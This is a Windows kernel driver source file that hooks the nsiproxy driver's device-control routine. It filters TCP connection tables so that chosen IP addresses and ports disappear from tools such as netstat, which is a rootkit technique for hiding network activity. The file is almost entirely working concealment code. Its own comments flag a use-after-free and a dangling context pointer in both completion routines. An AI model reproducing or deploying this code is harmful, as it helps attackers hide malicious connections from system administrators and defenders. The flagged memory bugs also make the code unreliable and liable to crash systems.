#include <ntifs.h>
#include "NetworkHook.h"

PDRIVER_OBJECT NsiHook::g_NetNSIProxyDriverObject = nullptr;
PDRIVER_DISPATCH NsiHook::g_NetOldNSIProxyDeviceControl = nullptr;

NTSTATUS NsiHook::NetHookNSIProxy()
{
	UNICODE_STRING NsiDriverName = RTL_CONSTANT_STRING(L"\\Driver\\nsiproxy");

	KdPrint(("Hooking NsiProxy..\n"));

	NTSTATUS status = ObReferenceObjectByName(
		&NsiDriverName,
		OBJ_CASE_INSENSITIVE,
		nullptr,
		0,
		*IoDriverObjectType,
		KernelMode,
		nullptr,
		(PVOID*)(&g_NetNSIProxyDriverObject));
	if (!NT_SUCCESS(status))
	{
		KdPrint(("ObReferenceObjectByName Faileed. Failed to find nsiproxy! (0x%08X)\n", status));
		return status;
	}

	if (g_NetOldNSIProxyDeviceControl == nullptr)
	{
		g_NetOldNSIProxyDeviceControl = g_NetNSIProxyDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL];

		if (g_NetOldNSIProxyDeviceControl == nullptr)
		{
			KdPrint(("Missing NSIProxy Handler\n"));
			return STATUS_SUCCESS;
		}
	}

	//perform IRP hook
// #pragma warning(suppress : 4311)
// #pragma warning(suppress : 4302)
	InterlockedExchange64(
		(LONG64*)&g_NetNSIProxyDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL],
		(LONG64)NetNSIProxyDeviceControlHook
	);

	return STATUS_SUCCESS;
}

BOOLEAN NsiHook::NetNSIFreeHook()
{
	if (g_NetOldNSIProxyDeviceControl)
	{
		InterlockedExchange64(
			(LONG64*)&g_NetNSIProxyDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL],
			(LONG64)g_NetOldNSIProxyDeviceControl
		);

		//decrease reference count of hooked driver
		ObDereferenceObject(g_NetNSIProxyDriverObject);

		return TRUE;
	}

	return FALSE;
}

#if DBG
// Declaration
typedef PCHAR(*GET_PROCESS_IMAGE_NAME) (PEPROCESS Process);
GET_PROCESS_IMAGE_NAME gGetProcessImageFileName;

char* GetProcessNameFromPid(HANDLE pid)
{
	PEPROCESS Process;
	if (PsLookupProcessByProcessId(pid, &Process) == STATUS_INVALID_PARAMETER)
	{
		return "pid???";
	}
	UNICODE_STRING sPsGetProcessImageFileName = RTL_CONSTANT_STRING(L"PsGetProcessImageFileName");
	gGetProcessImageFileName = (GET_PROCESS_IMAGE_NAME)MmGetSystemRoutineAddress(&sPsGetProcessImageFileName);
	// To use it
	if (NULL != gGetProcessImageFileName)
	{
		PCHAR pImageName = gGetProcessImageFileName(Process);
		return pImageName;
	}
	return "";
}

static VOID PrintTCPInformation(ULONG ProcessId, ULONG localIP, USHORT localPort, ULONG foreignIP)
{
	ASSERT(ProcessId);
	DbgPrint("%ld:[%s]\t", ProcessId, GetProcessNameFromPid((HANDLE)ProcessId));

	union
	{
		USHORT port;
		UCHAR portbytes[2];
	}port;

	ULONG localbytes[4]{};
	localbytes[0] = localIP & 0xFF;
	localbytes[1] = (localIP >> 8) & 0xFF;
	localbytes[2] = (localIP >> 16) & 0xFF;
	localbytes[3] = (localIP >> 24) & 0xFF;
	port.port = 0;
	port.portbytes[0] = (localPort >> 8) & 0xFF;
	port.portbytes[1] = localPort & 0xFF;
	DbgPrint("%d.%d.%d.%d:%d\t", localbytes[0], localbytes[1], localbytes[2], localbytes[3], port.port);


	ULONG foreignbytes[4]{};
	foreignbytes[0] = foreignIP & 0xFF;
	foreignbytes[1] = (foreignIP >> 8) & 0xFF;
	foreignbytes[2] = (foreignIP >> 16) & 0xFF;
	foreignbytes[3] = (foreignIP >> 24) & 0xFF;
	DbgPrint("%d.%d.%d.%d\n", foreignbytes[0], foreignbytes[1], foreignbytes[2], foreignbytes[3]);
}
#endif

NTSTATUS NsiHook::NetNSIProxyCompletionRoutineX86(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp,
	IN PVOID Context)
{
	KAPC_STATE ApcState{};
	PHOOKED_IO_COMPLETION HookedContext = (PHOOKED_IO_COMPLETION)Context;
	if (!NT_SUCCESS(Irp->IoStatus.Status))
	{
		goto free_exit;
	}

	NSI_PARAM* NsiParam = (NSI_PARAM*)(Irp->UserBuffer);
	if (!MmIsAddressValid(NsiParam->lpMem))
	{
		goto free_exit;
	}

	if ((NsiParam->UnknownParam8 != 0x38))
	{
		goto free_exit;
	}

	PINTERNAL_TCP_TABLE_ENTRY pTcpEntry = (PINTERNAL_TCP_TABLE_ENTRY)NsiParam->lpMem;
	PNSI_STATUS_ENTRY pNsiStatusEntry = (PNSI_STATUS_ENTRY)NsiParam->lpStatus;
#if DBG
	PNSI_PROCESSID_INFO  pNsiProcessIdInfo = (PNSI_PROCESSID_INFO)NsiParam->UnknownParam13;
#endif
	DWORD numOfEntries = NsiParam->TcpConnCount;

	KeStackAttachProcess(HookedContext->RequestingProcess, &ApcState);
	for (DWORD i = 0; i < numOfEntries; i++)
	{
#if DBG
		/* PrintSocketAddr(pTcpEntry[i].localEntry.dwIP, pTcpEntry[i].localEntry.Port,
			pTcpEntry[i].remoteEntry.dwIP);	*/
		PrintTCPInformation(pNsiProcessIdInfo->dwProcessId, pTcpEntry[i].localEntry.dwIP, pTcpEntry[i].localEntry.Port,
			pTcpEntry[i].remoteEntry.dwIP);
#endif

		if (NetHook::NetIsHiddenIpAddress(pTcpEntry[i].localEntry.dwIP,
			pTcpEntry[i].localEntry.Port,
			pTcpEntry[i].remoteEntry.dwIP))
		{
			// NSI will map status array entry to tcp table array entry
			// we must modify both synchronously
			RtlCopyMemory(&pTcpEntry[i], &pTcpEntry[i + 1], sizeof(INTERNAL_TCP_TABLE_ENTRY) * (numOfEntries - i));
			RtlCopyMemory(&pNsiStatusEntry[i], &pNsiStatusEntry[i + 1], sizeof(PNSI_STATUS_ENTRY) * (numOfEntries - i));
			numOfEntries--;
			NsiParam->TcpConnCount--;
			i--;
		}
	}
	KeUnstackDetachProcess(&ApcState);

free_exit:

	IoGetNextIrpStackLocation(Irp)->Context = HookedContext->OriginalContext;
	IoGetNextIrpStackLocation(Irp)->CompletionRoutine = HookedContext->OriginalCompletionRoutine;

	ExFreePoolWithTag(HookedContext, TAG_NET);

	//
	// ERR: There's a use after free here.
	//
	if ((HookedContext != nullptr) && (HookedContext->InvokeOnSuccess) && IoGetNextIrpStackLocation(Irp)->CompletionRoutine)
	{
		//
		// ERR: Pass a Dangling Context Argument
		//
		return IoGetNextIrpStackLocation(Irp)->CompletionRoutine(DeviceObject, Irp, Context);
	}
	else
	{
		if (Irp->PendingReturned)
		{
			IoMarkIrpPending(Irp);
		}
	}

	return STATUS_SUCCESS;
}

NTSTATUS NsiHook::NetNSIProxyCompletionRoutine(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp,
	IN PVOID Context)
{	
	KAPC_STATE ApcState{};
	PHOOKED_IO_COMPLETION HookedContext = (PHOOKED_IO_COMPLETION)Context;
	if (!NT_SUCCESS(Irp->IoStatus.Status))
	{
		goto free_exit;
	}

	PNSI_PARAM_2 NsiParam = (PNSI_PARAM_2)Irp->UserBuffer;
	if (!MmIsAddressValid(NsiParam->UnknownParam7))
	{
		goto free_exit;
	}

	if (NsiParam->UnknownParam8 != 0x38)
	{
		goto free_exit;
	}

	PINTERNAL_TCP_TABLE_ENTRY pTcpEntry = (PINTERNAL_TCP_TABLE_ENTRY)NsiParam->UnknownParam7;
	PNSI_STATUS_ENTRY pNsiStatusEntry = (PNSI_STATUS_ENTRY)NsiParam->UnknownParam11;
#if DBG
	PNSI_PROCESSID_INFO  pNsiProcessIdInfo = (PNSI_PROCESSID_INFO)NsiParam->UnknownParam13;
#endif
	SIZE_T numOfEntries = NsiParam->ConnCount;

	KeStackAttachProcess(HookedContext->RequestingProcess, &ApcState);

	for (SIZE_T i = 0; i < numOfEntries; i++)
	{
#if DBG
		// ASSERT(NsiBufferEntries[i].IpAddress == pTcpEntry[i].remoteEntry.dwIP);
		PrintTCPInformation(pNsiProcessIdInfo->dwProcessId, pTcpEntry[i].localEntry.dwIP, pTcpEntry[i].localEntry.Port,
			pTcpEntry[i].remoteEntry.dwIP);
#endif

		if (NetHook::NetIsHiddenIpAddress(pTcpEntry[i].localEntry.dwIP,
			pTcpEntry[i].localEntry.Port,
			pTcpEntry[i].remoteEntry.dwIP))
		{
			// RtlZeroMemory(&pTcpEntry[i], sizeof(INTERNAL_TCP_TABLE_ENTRY));

			// NSI will map status array entry to tcp table array entry
			// we must modify both synchronously
			RtlCopyMemory(&pTcpEntry[i], &pTcpEntry[i + 1], sizeof(INTERNAL_TCP_TABLE_ENTRY) * (numOfEntries - i));
			RtlCopyMemory(&pNsiStatusEntry[i], &pNsiStatusEntry[i + 1], sizeof(PNSI_STATUS_ENTRY) * (numOfEntries - i));
			numOfEntries--;
			NsiParam->ConnCount--;
			i--;
		}
	}

	KeUnstackDetachProcess(&ApcState);

free_exit:

	IoGetNextIrpStackLocation(Irp)->Context = HookedContext->OriginalContext;
	IoGetNextIrpStackLocation(Irp)->CompletionRoutine = HookedContext->OriginalCompletionRoutine;

	ExFreePoolWithTag(HookedContext, TAG_NET);

	//
	// ERR: There's a use after free here.
	//
	if ((HookedContext != nullptr) && (HookedContext->InvokeOnSuccess) && IoGetNextIrpStackLocation(Irp)->CompletionRoutine)
	{
		//
		// ERR: Pass a Dangling Context Argument
		//
		return IoGetNextIrpStackLocation(Irp)->CompletionRoutine(DeviceObject, Irp, Context);
	}
	else
	{
		if (Irp->PendingReturned)
		{
			IoMarkIrpPending(Irp);
		}
	}

	return STATUS_SUCCESS;
}

NTSTATUS NsiHook::NetNSIProxyDeviceControlHook(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp)
{
	PIO_STACK_LOCATION IrpStack{ IoGetCurrentIrpStackLocation(Irp) };
	ULONG io_control_code{ IrpStack->Parameters.DeviceIoControl.IoControlCode };

	if (IOCTL_NSI_GETALLPARAM == io_control_code)
	{
		//if call is relevent hook the CompletionRoutine
		PHOOKED_IO_COMPLETION hook = (PHOOKED_IO_COMPLETION)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(HOOKED_IO_COMPLETION), TAG_NET);
		if (hook == nullptr)
		{
			//call the original DeviceIoControl func
			return g_NetOldNSIProxyDeviceControl(DeviceObject, Irp);
		}

		hook->OriginalCompletionRoutine = IrpStack->CompletionRoutine;
		hook->OriginalContext = IrpStack->Context;

		IrpStack->Context = hook;		

		if (IrpStack->Parameters.DeviceIoControl.InputBufferLength == sizeof(NSI_PARAM_2))
		{			
			IrpStack->CompletionRoutine = NetNSIProxyCompletionRoutine;
		}
		else if (IrpStack->Parameters.DeviceIoControl.InputBufferLength == sizeof(NSI_PARAM))
		{
			IrpStack->CompletionRoutine = NetNSIProxyCompletionRoutineX86;
		}
		else
		{
			KdPrint(("InputBufferLength:%lu. Calling Original IO Function.\n",
				IrpStack->Parameters.DeviceIoControl.InputBufferLength));

			//call the original DeviceIoControl func
			ExFreePoolWithTag(hook, TAG_NET);
			return g_NetOldNSIProxyDeviceControl(DeviceObject, Irp);
		}	
		
		hook->RequestingProcess = PsGetCurrentProcess();
		hook->InvokeOnSuccess = (IrpStack->Control & SL_INVOKE_ON_SUCCESS) ? TRUE : FALSE;

		IrpStack->Control |= SL_INVOKE_ON_SUCCESS;
	}

	//call the original DeviceIoControl func
	return g_NetOldNSIProxyDeviceControl(DeviceObject, Irp);
}